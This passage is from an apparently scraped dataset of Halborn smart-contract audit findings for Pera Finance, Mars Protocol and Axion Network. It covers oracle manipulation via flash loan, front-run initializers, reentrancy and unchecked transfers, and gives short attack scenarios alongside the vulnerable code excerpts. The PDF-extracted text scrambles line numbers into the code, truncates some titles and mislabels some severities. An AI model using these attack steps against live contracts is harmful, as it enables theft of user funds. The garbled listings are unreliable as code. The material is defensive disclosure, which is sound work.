        "body": "In public functions, array arguments are immediately copied to memory, while external functions can read directly from calldata. Reading call- data is cheaper than memory allocation. Public functions need to write the arguments to memory because public functions may be called internally. Internal calls are passed internally by pointers to memory. Thus, the function expects its arguments being located in memory when the compiler generates the code for an internal function. Code Location: pera.sol Line #~263 pera.sol Line #~404 Risk Level: Likelihood - 1 Impact - 1 32 Recommendation: Consider declaring external variables instead of public variables. A best practice is to use external if expecting a function to only be called externally and public if called internally. Public functions are always accessible, but external functions are only available to external callers. SOLVED: Pera.Finance Team marked functions as an external. 33 3.10 (HAL-10) DOCUMENTATION - INFORMATIONAL ",
        "labels": [
            "Halborn",
            "Pera_Finance_SmartContract_Halborn_report_v1_1",
            "Severity: Informational"
        ]
    },
    {
        "title": "SOME PRICE SOURCES DO NOT PREVENT MANIPULATION OF ASSETS PRICE IN THE ORACLE",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/CosmWasm Smart Contract Audits/Mars_Protocol_Core_Contracts_CosmWasm_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "If an asset is created with execute_set_asset function in contracts/mars- oracle/src/contract.rs using AstroportSpot or AstroportLiquidityToken as price source, an attacker can create an imbalance in its corresponding pool in Astroport AMM protocol and obtain considerable profits at expenses of Mars markets. Below is described an attack scenario for an asset created with Astro- portSpot as price source. Initial balance for the pool is 8M tokens and 2M UST. Attack scenario: 1. Attacker obtains 3M UST (flash loan or whale) and swap them in Astroport AMM protocol to imbalance the Token-UST pool. 2. Attacker obtains 4.8M tokens in return for the swap and deposits them as collateral in mars-red-bank contract. 3. Attacker can borrow 5.6M UST from mars-red-bank contract. 4. Attacker returns flash loan and obtains 2.6M UST as profit at ex- penses of Mars market. A proof of concept video showing how to exploit this security issue is included in the report. 20 Code Location: If an asset is created with AstroportSpot as price source, its price is queried with AstroportQueryMsg::Simulation message, using a potentially imbalanced Astroport pool as information source. Listing 1: contracts/mars-oracle/src/contract.rs (Line 240) 239 PriceSourceChecked :: AstroportSpot { pair_address } = > { 240 241 } query_astroport_spot_price (& deps . querier , & pair_address ) Listing 2: contracts/mars-oracle/src/contract.rs (Line 403) 400 let response : SimulationResponse = 401 402 403 contract_addr : pair_address . to_string () , msg : to_binary (& AstroportQueryMsg :: Simulation { querier . query (& QueryRequest :: Wasm ( WasmQuery :: Smart { offer_asset }) ?, }) ) ?; 404 405 406 Ok ( Decimal :: from_ratio ( 407 408 409 )) response . return_amount + response . commission_amount , PROBE_AMOUNT , If an asset is created with AstroportLiquidityToken as price source, its price is queried using a potentially imbalanced Astroport pool as information source. Listing 3: contracts/mars-oracle/src/contract.rs (Lines 291,295,298) let pool = query_astroport_pool (& deps . querier , & pair_address ) ?; 287 PriceSourceChecked :: AstroportLiquidityToken { pair_address } => { 288 289 290 291 let asset0 : Asset = (& pool . assets [0]. info ). into () ; let asset0_price = query_asset_price ( deps , env . clone () , asset0 . get_reference () ) ?; let asset0_value = asset0_price * pool . assets [0]. amount ; let asset1 : Asset = (& pool . assets [1]. info ). into () ; let asset1_price = query_asset_price ( deps , env , asset1 . 292 293 294 295 21 get_reference () ) ?; let asset1_value = asset1_price * pool . assets [1]. amount ; let price = Decimal :: from_ratio ( asset0_value + asset1_value , pool . total_share ); Ok ( price ) 296 297 298 299 300 } Risk Level: Likelihood - 4 Impact - 5 Recommendation: Remove AstroportSpot and AstroportLiquidityToken as price sources for execute_set_asset and query_asset_price functions. As long as those price sources exist in the code (even if not frequently used), they are potential doors for extremely harmful attacks, i.e.: draining funds from Mars markets. Remediation plan: RISK ACCEPTED: The Mars team accepted the risk for this finding. They also stated that the mentioned price sources are useful when testing currently and will be comprehensive in the context of the risk that those price sources are not recommended for production. Furthermore, they will consider removing it entirely in future versions of the protocol if the community agrees. 22 ",
        "labels": [
            "Halborn",
            "Mars_Protocol_Core_Contracts_CosmWasm",
            "Severity: High"
        ]
    },
    {
        "title": "LIQUIDATION CAN TOTALLY CORRUPT THE VALUES OF TOTAL DEBT, INDEXES AND RATES",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/CosmWasm Smart Contract Audits/Mars_Protocol_Core_Contracts_CosmWasm_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "execute_liquidate function in contracts/mars-red-bank/src/contract.rs does not handle adequately the cases where debt and collateral are the same asset because changes on debt_market are overridden by changes on collateral_market. The values that can be totally corrupted on debt_market are the following:  debt_total_scaled  borrow_index  liquidity_index  indexes_last_updated  borrow_rate  liquidity_rate Proof of concept: 1. User liquidates using the same asset for collateral and debt: 23 2. The value of debt_total_scaled is updated with the amount repaid: 3. Changes on debt_market are overridden by changes on collateral_market because debt_asset_reference and collateral_asset_reference have the same value: 4. When testing, it was identified that value of debt_total_scaled had not been updated correctly: Code Location: execute_liquidate function receive collateral_asset and deb_asset as ar- guments of Asset type. Listing 4: contracts/mars-red-bank/src/contract.rs (Lines 1204,1205) 1199 pub fn execute_liquidate ( 1200 1201 1202 1203 1204 1205 mut deps : DepsMut , env : Env , _info : MessageInfo , liquidator_address : Addr , collateral_asset : Asset , debt_asset : Asset , 24 user_address : Addr , sent_debt_asset_amount : Uint128 , receive_ma_token : bool , 1206 1207 1208 1209 ) -> Result < Response , ContractError > { 1210 1211 let block_time = env . block . time . seconds () ; let ( debt_asset_label , debt_asset_reference , debt_asset_type ) = debt_asset . get_attributes () ; Changes on debt_market are overridden in contracts storage by changes on collateral_market. Listing 5: contracts/mars-red-bank/src/contract.rs (Lines 1416-1419) 1414 // save markets 1415 MARKETS . save ( deps . storage , debt_asset_reference . as_slice () , & debt_market ) ?; 1416 MARKETS . save ( 1417 1418 1419 deps . storage , collateral_asset_reference . as_slice () , & collateral_market , Risk Level: Likelihood - 5 Impact - 4 Recommendation: Update the logic of execute_liquidate function to handle correctly the cases where debt and collateral are the same asset. Remediation plan: SOLVED: The issue was fixed in the following commits:  82c6649db9536fffa67754c151d24eb97b109bc2  20d493c4b6b68586dedf43aa0de69989bc587b62 25 ",
        "labels": [
            "Halborn",
            "Mars_Protocol_Core_Contracts_CosmWasm",
            "Severity: High"
        ]
    },
    {
        "title": "SLASH EVENTS CAN BE OVERWRITTEN WHEN TRANSFERRING MARS TOKENS",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/CosmWasm Smart Contract Audits/Mars_Protocol_Core_Contracts_CosmWasm_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "execute_transfer_mars function in contracts/mars-staking/src/contract.rs allows owner to transfer Mars tokens to some recipient. Every time this operation is done, a slash event is created with env.block.height as key and slash_percentage as value. When users claim, slash events are applied in chronological order to adjust and reduce claim amount to the real value. However if execute_transfer_mars function is called two or more times during the same block, previous slash events will be overwritten by the new ones. As a consequence, users will be able to claim more at expenses of the mars-staking contract funds. Code Location: Listing 6: contracts/mars-staking/src/contract.rs (Lines 381-382) 377 let slash_percentage = Decimal :: from_ratio ( amount , total_mars_in_staking_contract ); 378 379 SLASH_EVENTS . save ( 380 381 382 383 ) ?; deps . storage , U64Key :: new ( env . block . height ) , & { slash_percentage }, Risk Level: Likelihood - 3 Impact - 5 26 Recommendation: Update the logic of execute_transfer_mars function to throw error messages if a slash event with the same key (current env.block.height) has already been created before. Remediation plan: SOLVED: The issue was fixed in commit 7b5fbcc9301b3cbb195098a2a6edb143abb166fc. 27 ",
        "labels": [
            "Halborn",
            "Mars_Protocol_Core_Contracts_CosmWasm",
            "Severity: High"
        ]
    },
    {
        "title": "MARS TOKENS CAN GET LOCKED IN CONTRACT WHEN UNSTAKING",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/CosmWasm Smart Contract Audits/Mars_Protocol_Core_Contracts_CosmWasm_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "a user calls execute_unstake When contracts/mars- staking/src/contract.rs with a recipient address in upper case (e.g.: TERRA1KG. . . XNL8), the claim is stored in CLAIMS with the upper case address as a key. function in As a consequence, when the recipient tries to claim with execute_claim function, he wont be able to do it because the claim is loaded from CLAIMS using info.sender as a key, which is always in lower case (e.g.: terra1kg. . . xnl8), i.e.: his Mars tokens get locked in contract forever. Code Location: If recipient address is in upper case, execute_unstake function will store the claim in CLAIMS with the upper case address as a key. Listing 7: contracts/mars-staking/src/contract.rs (Lines 268,273) 267 let recipient = option_recipient . unwrap_or_else (|| staker . clone () ); let recipient_addr = deps . api . addr_validate (& recipient ) ?; if CLAIMS . may_load ( deps . storage , & recipient_addr ) ?. is_some () { return Err ( ContractError :: UnstakeActiveClaim {}) ; } CLAIMS . save ( deps . storage , & recipient_addr , & claim ) ?; 268 269 270 271 272 273 28 execute_claim function loads claim from CLAIMS using info.sender as a key, which is always in lower case. Listing 8: contracts/mars-staking/src/contract.rs (Line 307) 301 pub fn execute_claim ( 302 303 304 305 306 ) -> Result < Response , ContractError > { 307 deps : DepsMut , env : Env , info : MessageInfo , option_recipient : Option < String >, let mut claim = CLAIMS . load ( deps . storage , & info . sender ) ?; Risk Level: Likelihood - 4 Impact - 4 Recommendation: Update the logic of execute_unstake function to turn address into lower case for recipient. Remediation plan: SOLVED: The issue was fixed in commit 14fdcc2c207f6528e31952f33eb36c32a4a00bf4. 29 ",
        "labels": [
            "Halborn",
            "Mars_Protocol_Core_Contracts_CosmWasm",
            "Severity: High"
        ]
    },
    {
        "title": "TOTAL MARS FOR CLAIMERS IS MISCALCULATED WHEN TRANSFERRING MARS TOKENS",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/CosmWasm Smart Contract Audits/Mars_Protocol_Core_Contracts_CosmWasm_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "execute_transfer_mars function in contracts/mars-staking/src/contract.rs allows owner to transfer Mars tokens to some recipient. Every time this operation is done, total_mars_for_claimers is updated, but its value is wrongly calculated. As a consequence, in some scenarios legitimate users will not be able to claim from mars-staking contract as expected and operation will panic because of underflow. Code Location: Listing 9: contracts/mars-staking/src/contract.rs (Line 386) 377 let slash_percentage = Decimal :: from_ratio ( amount , total_mars_in_staking_contract ); deps . storage , U64Key :: new ( env . block . height ) , & SlashEvent { slash_percentage }, 378 379 SLASH_EVENTS . save ( 380 381 382 383 ) ?; 384 385 let mut global_state = GLOBAL_STATE . load ( deps . storage ) ?; 386 global_state . total_mars_for_claimers = global_state . total_mars_for_claimers * slash_percentage ; 387 GLOBAL_STATE . save ( deps . storage , & global_state ) ?; Risk Level: Likelihood - 4 Impact - 4 30 Recommendation: Fix the logic of execute_transfer_mars function to multiply the value of current total_mars_for_claimers by 1 - slash_percentage when trying to update its value. Remediation plan: SOLVED: The issue was fixed in commit 956c935553d02bbc7f2a3d0198f312d15e75420f. 31 ",
        "labels": [
            "Halborn",
            "Mars_Protocol_Core_Contracts_CosmWasm",
            "Severity: High"
        ]
    },
    {
        "title": "TOKENS GET LOCKED WHEN TRANSFERRING TO UPPER",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/CosmWasm Smart Contract Audits/Mars_Protocol_Core_Contracts_CosmWasm_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "When accounts transfer / send mars-ma-token or mars-xmars-token to a recipient address in upper case (e.g.: TERRA1KG. . . XNL8), the new balance is stored in BALANCES with the upper case address as a key. As a consequence, when the recipient tries to use his tokens, he wont be able to do it because the balance is loaded from BALANCES using info. sender as a key, which is always in lower case (e.g.: terra1kg. . . xnl8), i.e.: his tokens get locked forever. The affected smart contracts are the following:  mars-ma-token  mars-xmars-token  mars-red-bank  mars-staking Code Location: Listing 10: Resources affected 1 2 mars - ma - token : execute_transfer ( recipient_unchecked ) mars - ma - token : execute_transfer_on_liquidation ( recipient_unchecked ) 3 4 5 6 7 8 9 10 mars - ma - token : execute_send ( contract_unchecked ) mars - ma - token : execute_transfer_from ( recipient ) mars - ma - token : execute_send_from ( contract ) mars - xmars - token : execute_transfer ( recipient ) mars - xmars - token : execute_send ( contract ) mars - xmars - token : execute_transfer_from ( recipient ) mars - xmars - token : execute_send_from ( contract ) mars - red - bank : execute_liquidate ( liquidator_address ) 32 11 12 mars - staking : execute_claim ( option_recipient ) mars - staking : execute_transfer_mars ( recipient_unchecked ) Risk Level: Likelihood - 4 Impact - 4 Recommendation: Update the logic of functions mentioned above to turn recipient addresses into lower case. Remediation plan: PENDING: The Mars team stated that in the short term they would analyze how to address this issue comprehensively on the protocol. 33 ",
        "labels": [
            "Halborn",
            "Mars_Protocol_Core_Contracts_CosmWasm",
            "Severity: High"
        ]
    },
    {
        "title": "POSSIBILITY TO LIQUIDATE WHEN COLLATERAL ASSET IS UNSET",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/CosmWasm Smart Contract Audits/Mars_Protocol_Core_Contracts_CosmWasm_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "execute_liquidate function in contracts/mars-red-bank/src/contract.rs does not restrict that liquidations are done using only assets set as collaterals. As a consequence, users are able to liquidate debts using even collaterals that borrowers have explicitly unset, which could affects borrowers lending strategy. Code Location: execute_liquidate function does not verify if collateral_asset is set as collateral. Listing 11: contracts/mars-red-bank/src/contract.rs 1232 let ( collateral_asset_label , collateral_asset_reference , collateral_asset_type ) = collateral_asset . get_attributes () ; 1233 1234 1235 let mut collateral_market = 1236 MARKETS . load ( deps . storage , collateral_asset_reference . as_slice () ) ?; return Err ( ContractError :: MarketNotActive { 1237 1238 if !collateral_market . active { 1239 1240 1241 1242 } 1243 1244 // check if user has available collateral in specified collateral asset : collateral_asset_label , }) ; asset to be liquidated 1245 let user_collateral_balance_scaled = cw20_get_balance ( 1246 1247 1248 & deps . querier , collateral_market . ma_token_address . clone () , user_address . clone () , 34 1249 ) ?; 1250 let user_collateral_balance = get_underlying_liquidity_amount ( 1251 1252 1253 1254 ) ?; 1255 if user_collateral_balance . is_zero () { return Err ( ContractError :: 1256 user_collateral_balance_scaled , & collateral_market , block_time , CannotLiquidateWhenNoCollateralBalance {}) ; 1257 } Risk Level: Likelihood - 4 Impact - 3 Recommendation: the logic Update if execute_liquidate collateral_asset parameter is set as collateral. Otherwise, it should throw an error message. function verify of to Remediation plan: SOLVED: The issue was fixed in commit 256559bb553cbffe6683a596f03a2d4eb2bd0a95. 35 ",
        "labels": [
            "Halborn",
            "Mars_Protocol_Core_Contracts_CosmWasm",
            "Severity: Medium"
        ]
    },
    {
        "title": "NO MINIMUM THRESHOLD FOR SOME PARAMETERS OF COUNCIL CONFIGURATION",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/CosmWasm Smart Contract Audits/Mars_Protocol_Core_Contracts_CosmWasm_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "from function validate not validate that proposal_required_threshold, proposal_effective_delay or proposal_expiration_period from Config has a minimum threshold, which could generate the following situations: packages/mars-core/src/council.rs does  Proposals can be passed without reaching the majority of votes.  Malicious changes proposed through voting could even be executed immediately, not allowing legitimate users to react timely.  Proposals could never be executed if expiration period is not ap- propriately set. Code Location: Listing 12: packages/mars-core/src/council.rs (Lines 32,42) Self :: less_or_equal_one (& self . proposal_required_quorum ) , \" proposal_required_quorum \" , ( let conditions_and_names = vec! [ 31 pub fn validate (& self ) -> Result <() , MarsError > { 32 33 34 35 36 37 38 39 40 41 42 43 } ]; all_conditions_valid ( conditions_and_names ) ) , ( ) , Self :: less_or_equal_one (& self . proposal_required_threshold ) , \" proposal_required_threshold \" , 36 Risk Level: Likelihood - 1 Impact - 5 Recommendation: Update the logic of validate function to ensure the following conditions: 1. proposal_required_threshold is greater or equal than 0.5. 2. proposal_expiration_period exceeds 0. 3. proposal_effective_delay is greater or equal than a minimum threshold that allows Mars users to act timely against any issue that the protocol could have when changes are made. The following are some examples of timelocks used on other protocols:  Uniswap: 48-hours timelock  Compound: 48-hours timelock Remediation plan: PARTIALLY SOLVED: The issue for proposal_required_threshold was fixed in the following commits:  4c64bd62088be852d55b94a956884d0ab185c421  1f78cc5d4f98cb37548ca6ca1d63029f231ae404 The Mars team also claimed that they will consider adding the remaining restrictions in future versions of the protocol. 37 ",
        "labels": [
            "Halborn",
            "Mars_Protocol_Core_Contracts_CosmWasm",
            "Severity: Medium"
        ]
    },
    {
        "title": "LOAN LIMIT CAN BE UPDATED FOR USERS WITH COLLATERALIZED DEBTS",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/CosmWasm Smart Contract Audits/Mars_Protocol_Core_Contracts_CosmWasm_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "execute_update_uncollateralized_loan_limit function in contracts/mars- red-bank/src/contract.rs allows updating the loan limit for users with collateralized debts. As a consequence, their debts would be reset (amount_scaled = 0) without have been repaid or liquidated by someone else, which greatly affects contracts funds. It is worth noting that likelihood for this to happen is limited because mars-red-bank contract is intended to be owned by governance indefinitely, who is the responsible one for this operation. Code Location: Listing 13: contracts/mars-red-bank/src/contract.rs (Lines 636-639) deps . storage , ( asset_reference . as_slice () , & user_address ) , & new_limit , 626 UNCOLLATERALIZED_LOAN_LIMITS . save ( 627 628 629 630 ) ?; 631 632 DEBTS . update ( 633 634 635 636 637 638 639 640 deps . storage , ( asset_reference . as_slice () , & user_address ) , | debt_opt : Option < Debt >| -> StdResult <_ > { let mut debt = debt_opt . unwrap_or ( Debt { amount_scaled : Uint128 :: zero () , uncollateralized : false , }) ; // if limit == 0 then uncollateralized = false , otherwise uncollateralized = true 641 642 debt . uncollateralized = !new_limit . is_zero () ; Ok ( debt ) 38 Risk Level: Likelihood - 2 Impact - 4 Recommendation: Update the logic of execute_update_uncollateralized_loan_limit function to restrict that loan limit can be updated only for users with no col- lateralized debts. Otherwise, it should throw an error message. Remediation plan: SOLVED: The issue was fixed in commit bc2936b3953ef0006e0511164170ec8aff98746a. 39 3.10 (HAL-10) RESTRICTION TO NOT SWAP MARS TOKENS CAN BE BYPASSED - MEDIUM ",
        "labels": [
            "Halborn",
            "Mars_Protocol_Core_Contracts_CosmWasm",
            "Severity: Informational"
        ]
    },
    {
        "title": "FRONT",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Axion_Network_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "of declaration function initialize(address _manager, address The _migrator).. is used in almost all scope contracts. It is required a call to the initialize function after deploying it to initialize the manager, migrator, and external_caller_role roles. There is no require checking within the initialize function. There are functions that can be front-run, allowing an attacker to incorrectly initialize the contracts. Attack scenario: 1. Deployed the contract from 0xAb8483F64d9C6d1EcF9b849Ae677dD3315835cb2 2. Calling initialize function from 0x617F2E2fD72FD9D5503197092aC168c91465E7f2 15 3. Call from owner address (0xAb8483F64d9C6d1EcF9b849Ae677dD3315835cb2) is denied after malicious initialization Code Location: Listing 2: VentureCapital.sol (Lines 147,148,149,150,152) 257 258 259 260 261 262 263 function initialize ( address _manager , address _migrator ) public initializer { _setupRole ( MANAGER_ROLE , _manager ); _setupRole ( MIGRATOR_ROLE , _migrator ); _setupRole ( EXTERNAL_CALLER_ROLE , _manager ); _setupRole ( EXTERNAL_CALLER_ROLE , _migrator ); } 16 Listing 3: Accelerator.sol (Lines 503,504) 500 501 502 503 504 function initialize ( address _migrator , address _manager ) external initializer { /* * Setup roles and addresses */ _setupRole ( MIGRATOR_ROLE , _migrator ); _setupRole ( MANAGER_ROLE , _manager ); } Listing 4: BPD.sol 116 117 118 119 function initialize ( address _migrator , address _stakeManager ) external initializer { _setupRole ( MIGRATOR_ROLE , _migrator ); _setupRole ( EXTERNAL_CALLER_ROLE , _stakeManager ); } Listing 5: StakeBurner.sol 287 288 289 290 function initialize ( address _manager , address _migrator ) external initializer { _setupRole ( MANAGER_ROLE , _manager ); _setupRole ( MIGRATOR_ROLE , _migrator ); } Listing 6: StakeMinter.sol 213 214 215 216 function initialize ( address _manager , address _migrator ) external initializer { _setupRole ( MANAGER_ROLE , _manager ); _setupRole ( MIGRATOR_ROLE , _migrator ); } Listing 7: StakeReminter.sol 85 86 87 88 function initialize ( address _manager , address _migrator ) external initializer { _setupRole ( MANAGER_ROLE , _manager ); _setupRole ( MIGRATOR_ROLE , _migrator ); } 17 Listing 8: StakeToken.sol 153 154 155 156 157 158 159 160 161 162 163 164 165 166 function initialize ( address _manager , address _migrator , string memory name , string memory symbol ) external initializer { _setupRole ( MANAGER_ROLE , _manager ); _setupRole ( MIGRATOR_ROLE , _migrator ); enabled = true ; // Initially Enabled transferEnabled = false ; // Initially disabled __ERC721_init ( name , symbol ); __ERC721Enumerable_init () ; } Listing 9: StakeUpgrader.sol 151 152 153 154 function initialize ( address _manager , address _migrator ) external initializer { _setupRole ( MANAGER_ROLE , _manager ); _setupRole ( MIGRATOR_ROLE , _migrator ); } Listing 10: StakeCustodian.sol 45 46 47 48 49 50 51 52 53 54 55 function initialize ( address _migrator , address _stakeMinter , address _stakeBurner , address _stakeUpgrader ) external initializer { _setupRole ( MIGRATOR_ROLE , _migrator ); _setupRole ( EXTERNAL_CALLER_ROLE , _stakeMinter ); _setupRole ( EXTERNAL_CALLER_ROLE , _stakeBurner ); _setupRole ( EXTERNAL_CALLER_ROLE , _stakeUpgrader ); } 18 Listing 11: StakeManager.sol 631 632 633 634 function initialize ( address _manager , address _migrator ) external initializer { _setupRole ( MANAGER_ROLE , _manager ); _setupRole ( MIGRATOR_ROLE , _migrator ); } Listing 12: Token.sol 46 47 48 49 50 51 52 53 54 55 56 57 58 function initialize ( address _manager , address _migrator , string memory _name , string memory _symbol ) public initializer { _setupRole ( MANAGER_ROLE , _manager ); _setupRole ( MIGRATOR_ROLE , _migrator ); __ERC20_init ( _name , _symbol ); /* * I do not understand this */ swapIsOver = false ; } Listing 13: DataReader.sol 46 47 48 49 50 51 52 53 54 55 56 57 58 59 function initialize ( address _manager , address _staking , address _stakingV1 , address _auction , address _auctionV1 ) public initializer { _setupRole ( MANAGER_ROLE , _manager ); staking = IStakingDataV2 ( _staking ); stakingV1 = IStakingV1 ( _stakingV1 ); auction = IAuctionDataV2 ( _auction ); auctionV1 = IAuctionV1 ( _auctionV1 ); } 19 Risk Level: Likelihood - 1 Impact - 5 Recommendation: It is recommended to declare a constructor instead of an initialize function to set up roles at the time of deployment to mitigate the issue. Otherwise, add a require statement to each initialize function to verify that the function is called by the contract owner only, and post verification roles should be setup. Otherwise, setting the owner in the contracts constructor to the msg.sender and adding the onlyOwner modifier to all initializers would be enough for access control. Another solution is using a factory pattern that will deploy and initialize the contracts atomically to prevent front-running of the initialization. Remediation Plan: SOLVED: Values will be hardcoded by the Axion Network team. 20 ",
        "labels": [
            "Halborn",
            "Axion_Network",
            "Severity: Medium"
        ]
    },
    {
        "title": "LACK OF INTEGER OVERFLOW PROTECTION",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Axion_Network_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "The overflow happens when an arithmetic operation reaches the maximum size of a type. For instance in the VentureCapital.sol contract on getTokenInterestEarned method, multiplication of contracts.stakingV2 .getTotalSharesOf(accountAddress)*tokenPricePerShare[tokenAddress] in the return calculation on the interest earned by an address for a specific dividend token may end up overflowing the integer. In computer programming, an integer overflow occurs when an arithmetic operation attempts to create a numeric value that is outside of the range that can be represented with a given number of bits -- either larger than the maximum or lower than the minimum re-presentable value. Code Location: Listing 14: VentureCapital.sol (Lines 310,311) 303 304 305 306 307 308 309 310 311 312 313 314 315 316 function getTokenInterestEarned ( address accountAddress , address tokenAddress ) external view returns ( uint256 ) { } if ( isVcaRegistered [ accountAddress ] == false ) { return (( contracts . stakingV2 . getTotalSharesOf ( accountAddress ) * tokenPricePerShare [ tokenAddress ]) - contracts . stakingV2 . getDeductBalances ( accountAddress , tokenAddress )) / 1 e36 ; } return getTokenInterestEarnedInternal ( accountAddress , tokenAddress ); 21 Risk Level: Likelihood - 3 Impact - 3 Recommendation: Currently not all the smart contracts and the operations within them are using the SafeMath library which makes some operations vulnerable to overflows/underflows. It is recommended to use the SafeMath library for arithmetic operations consistently throughout ALL the mathematical operations in the smart contract system. Reference: Ethereum Smart Contract Best Practices - Integer Overflow and Underflow Remediation Plan: NOT APPLICABLE: The Axion Network team claims that due to their use of Pragma > 0.8.0 safe math is not necessary, the run time will fail if there is an overflow. 22 ",
        "labels": [
            "Halborn",
            "Axion_Network",
            "Severity: Medium"
        ]
    },
    {
        "title": "UNCHECKED TRANSFER",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Axion_Network_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "contract Token.sol, StakeManager.sol, VentureCapital.sol, In Accelerator.sol, and StakingV21.sol the return value of some external Several tokens do not transfer/transferFrom calls are not checked. revert in case of failure and return false. If one of these tokens is used, a deposit would not revert if the transfer fails, and an attacker could deposit tokens for free. Code Location: Listing 15: Token.sol (Lines 121) 116 117 118 119 120 121 122 123 } function recovery ( address recoverFor , address tokenToRecover , uint256 amount ) external onlyMigrator { IERC20 ( tokenToRecover ). transfer ( recoverFor , amount ); } Listing 16: StakeManager.sol (Lines 504,505,506,507) 502 503 504 505 506 507 function getTodaysInterest () internal returns ( uint256 ) { uint256 amountTokenInDay = IERC20Upgradeable ( contracts . token ). balanceOf ( address ( this )) ; IERC20Upgradeable ( contracts . token ). transfer ( 0 x000000000000000000000000000000000000dEaD , amountTokenInDay ); 23 Listing 17: VentureCapital.sol (Lines 136) 135 136 137 138 139 if ( tokenAddress != address (0 xFFfFfFffFFfffFFfFFfFFFFFffFFFffffFfFFFfF )) { IERC20Upgradeable ( tokenAddress ). transfer ( to , tokenInterestEarned ); } else { to . transfer ( tokenInterestEarned ); } Listing 18: VentureCapital.sol (Lines 147,148,149,150) 144 145 146 147 148 149 150 151 function withdrawOriginDivTokens ( address tokenAddress ) external onlyExternalCaller { /* * 0 xFF ... is our ethereum placeholder address */ if ( tokenAddress != address (0 xFFfFfFffFFfffFFfFFfFFFFFffFFFffffFfFFFfF )) { IERC20Upgradeable ( tokenAddress ). transfer ( msg . sender , originWithdrawableTokenAmounts [ tokenAddress ] ); } else { Listing 19: Accelerator.sol (Lines 193) 192 193 /* * Transfer tokens to contract */ IERC20 ( _token ). transferFrom ( msg . sender , address ( this ) , _amount ); Listing 20: Accelerator.sol (Lines 222) 221 222 // ** Transfer tokens to Manager */ IERC20 ( _token ). transfer ( recipient , _recipientAmount ); Listing 21: StakingV21.sol (Lines 116,123) 111 112 113 function transferTokens ( address vcAuction , address stakeManager ) external onlyMigrator { for ( uint8 i = 0; i < divTokens . length () ; i ++) { if ( divTokens . at ( i) != address (0 xFFfFfFffFFfffFFfFFfFFFFFffFFFffffFfFFFfF )) { 24 114 115 116 117 118 119 120 121 122 123 124 IERC20Upgradeable token = IERC20Upgradeable ( divTokens . at ( i )) ; token . transfer ( vcAuction , token . balanceOf ( address ( this )) ); } else { payable ( vcAuction ). transfer ( address ( this ). balance ) ; } } IERC20Upgradeable axn = IERC20Upgradeable ( addresses . mainToken ); axn . transfer ( stakeManager , axn . balanceOf ( address ( this ))); } Risk Level: Likelihood - 2 Impact - 4 Recommendation: is It transfer/transferFrom return value is checked. recommended SafeERC20, use to or ensure that the Remediation Plan: SOLVED: The Axion Network team solved the issue by using SafeERC20 implementation and added the safetransfer function to the code. 25 ",
        "labels": [
            "Halborn",
            "Axion_Network",
            "Severity: Medium"
        ]
    },
    {
        "title": "MISSING RE",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Axion_Network_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "In VentureCapital.sol, It was identified that axion-contracts-v3 are missing nonReentrant guard. withdrawOriginDivTokens, contract StakeReminter.sol function remintStakeInternal, and contract StakeMinter.so function convertToNft are missing nonReentrant guard. Also, in these functions, external calls are called before all state changes are resolved, and read/write to persistent state following external call, making it vulnerable to a Reentrancy attack. function Although administrative restrictions are imposed but to protect against cross-function reentrancy attacks, it may be necessary to use a mutex. By using this lock, an attacker can no longer exploit the function with a recursive call. OpenZeppelin has its own mutex implementation called ReentrancyGuard which provides a modifier to any function called nonReentrant that guards the function with a mutex against the Reentrancy attacks. Code Location: Listing 22: VentureCapital.sol (Lines 147,148,149,150,152) 144 145 146 147 148 149 150 151 152 153 function withdrawOriginDivTokens ( address tokenAddress ) external onlyExternalCaller { /* * 0 xFF ... is our ethereum placeholder address */ if ( tokenAddress != address (0 xFFfFfFffFFfffFFfFFfFFFFFffFFFffffFfFFFfF )) { IERC20Upgradeable ( tokenAddress ). transfer ( msg . sender , originWithdrawableTokenAmounts [ tokenAddress ] ); } else { payable ( msg . sender ). transfer ( originWithdrawableTokenAmounts [ tokenAddress ]) ; } 26 154 155 156 } originWithdrawableTokenAmounts [ tokenAddress ] = 0; Listing 23: StakeReminter.sol (Lines 80,81) 71 72 73 74 75 76 77 78 79 80 81 82 function remintStakeInternal ( uint256 payout , uint256 topup , uint256 stakingDays ) internal { if ( topup != 0) { payout = payout + topup ; } contracts . token . burn ( msg . sender , payout ); // Burn the payout amount before restaking contracts . stakeMinter . externalStake ( payout , stakingDays , msg . sender ); } Listing 24: StakeMinter.sol (Lines 100) 94 95 96 97 98 99 100 101 function convertToNft ( uint256 stakeId ) external { require ( contracts . stakeCustodian . removeStake ( msg . sender , stakeId ) , ' STAKE MINTER : Not owner of stake or already converted . ' ); contracts . stakeToken . mint ( msg . sender , stakeId ); // 120 k } Risk Level: Likelihood - 1 Impact - 3 27 Recommendation: Change the code to follow the checks-effects-interactions pattern and use ReentrancyGuard through the nonReentrant modifier. Remediation Plan: SOLVED: The Axion Network team claims that - Listing 22: This code no longer exists in their not-backwards branch. - Listing 23: Before calling external stake they burn the users token, 